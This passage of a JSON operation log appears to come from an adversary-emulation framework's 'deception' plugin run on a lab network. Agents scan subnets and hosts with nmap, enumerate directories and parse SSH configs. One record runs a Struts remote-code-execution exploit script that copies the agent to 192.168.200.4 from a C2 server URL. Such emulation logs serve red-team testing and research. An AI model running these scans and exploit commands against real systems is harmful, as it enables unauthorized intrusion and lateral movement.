"fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.3,4,5", "created": "2024-04-26T23:40:15Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "0a760943-eea8-426d-99d8-7b4784ee2f9e", "collect": "2024-04-26T23:40:19Z", "finish": "2024-04-26T23:40:28Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:40:19Z"}, {"id": "d10cc462-0110-40d8-9a8a-d37d5d275f6a", "paw": "rezmky", "command": "python3 strutsExploit.py 192.168.200.4:8080 http://10.20.20.1:8888", "plaintext_command": "python3 strutsExploit.py 192.168.200.4:8080 http://10.20.20.1:8888", "status": 0, "score": 3, "decide": "2024-04-26T23:40:30Z", "pin": 0, "pid": "1769", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.200.4", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:30Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}, {"unique": "host.lateralMove.port8080", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": 8080, "created": "2024-04-26T23:40:30Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}], "unique": "d10cc462-0110-40d8-9a8a-d37d5d275f6a", "collect": "2024-04-26T23:40:35Z", "finish": "2024-04-26T23:40:37Z", "ability": {"ability_id": "deception-struts", "tactic": "deception-lateral-movement", "technique_name": "Struts", "technique_id": "T9061", "name": "Exploit Apache Struts RCE", "description": "Copies agent to target using Apache Struts RCE", "executors": [{"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "python3 strutsExploit.py #{host.lateralMove.ip}:#{host.lateralMove.port} #{server}", "code": null, "language": null, "build_target": null, "payloads": ["strutsExploit.py"], "uploads": [], "timeout": 30, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:40:35Z"}, {"id": "9c506967-3046-40d3-8631-6f97255dd544", "paw": "czljvk", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:40:40Z", "pin": 0, "pid": "1454", "facts": [], "relationships": [], "used": [], "unique": "9c506967-3046-40d3-8631-6f97255dd544", "collect": "2024-04-26T23:40:43Z", "finish": "2024-04-26T23:40:51Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:40:43Z"}, {"id": "bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "paw": "czljvk", "command": "ls -l /home/tomcat/", "plaintext_command": "ls -l /home/tomcat/", "status": 0, "score": 1, "decide": "2024-04-26T23:40:55Z", "pin": 0, "pid": "1471", "facts": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:40:55Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}, {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "fe2f6f79-c116-48b3-9fd3-20947b3992db", "76974f3a-6a64-46a0-a73c-baeff3fc0cf4", "ad7463f9-d256-4ec9-8995-e54deeab4ac5", "0473c7dc-bdbc-47eb-882b-216d0a0e5402"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr", "gbimmx", "jyirhn"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47772e0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48f26e0>", "source": {"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:40:55Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/tomcat/splunkd']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/tomcat/splunkd"], "created": "2024-04-26T23:40:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/tomcat/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/tomcat/", "created": "2024-04-26T23:40:55Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["bc961b42-1eed-492c-bc9e-9491fe7ce6d0"], "relationships": ["host.dir.path(/home/tomcat/) : has_contents : host.dir.files(['/home/tomcat/splunkd'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": null}], "unique": "bc961b42-1eed-492c-bc9e-9491fe7ce6d0", "collect": "2024-04-26T23:40:57Z", "finish": "2024-04-26T23:40:57Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:40:57Z"}, {"id": "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "paw": "czljvk", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:41:00Z", "pin": 0, "pid": "1473", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:41:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7a846efd-64e1-4d5f-acaf-b7f0daf27897"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c95de0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c96710>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:41:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.202.3']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.202.3"], "created": "2024-04-26T23:41:12Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:41:00Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "collect": "2024-04-26T23:41:09Z", "finish": "2024-04-26T23:41:12Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:41:09Z"}, {"id": "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "paw": "czljvk", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:41:15Z", "pin": 0, "pid": "1475", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:41:25Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a58a0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf49a6a70>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:41:25Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:41:25Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:41:15Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "collect": "2024-04-26T23:41:22Z", "finish": "2024-04-26T23:41:25Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:41:22Z"}, {"id": "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "paw": "czljvk", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:41:25Z", "pin": 0, "pid": "1477", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:41:36Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["czljvk", "cxfxwj", "dagwxr"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483c070>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf483d270>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:41:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:41:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:41:25Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "collect": "2024-04-26T23:41:33Z", "finish": "2024-04-26T23:41:35Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:41:33Z"}, {"id": "b0cbf699-ce65-4366-b6b0-41edfb6611d3", "paw": "czljvk", "command": "nmap -sV --version-light -oX - 192.168.202.3", "plaintext_command": "nmap -sV --version-light -oX - 192.168.202.3", "status": 0, "score": 1, "decide": "2024-04-26T23:41:40Z", "pin": 0, "pid": "1479", "facts": [{"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["b0cbf699-ce65-4366-b6b0-41edfb6611d3"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22"], "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["b0cbf699-ce65-4366-b6b0-41edfb6611d3"], "relationships": ["host.remote.ip(192.168.202.3) : has_open_ports : host.remote.ports(['22'])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"]], "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["b0cbf699-ce65-4366-b6b0-41edfb6611d3"], "relationships": ["host.remote.ip(192.168.202.3) : has_port_services : host.remote.port_services([('22', 'ssh')])"], "limit_count": -1, "collected_by": ["czljvk"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4774f70>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf47741f0>", "source": {"unique": "host.remote.ip192.168.202.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.202.3", "created": "2024-04-26T23:41:42Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22']", "trait": 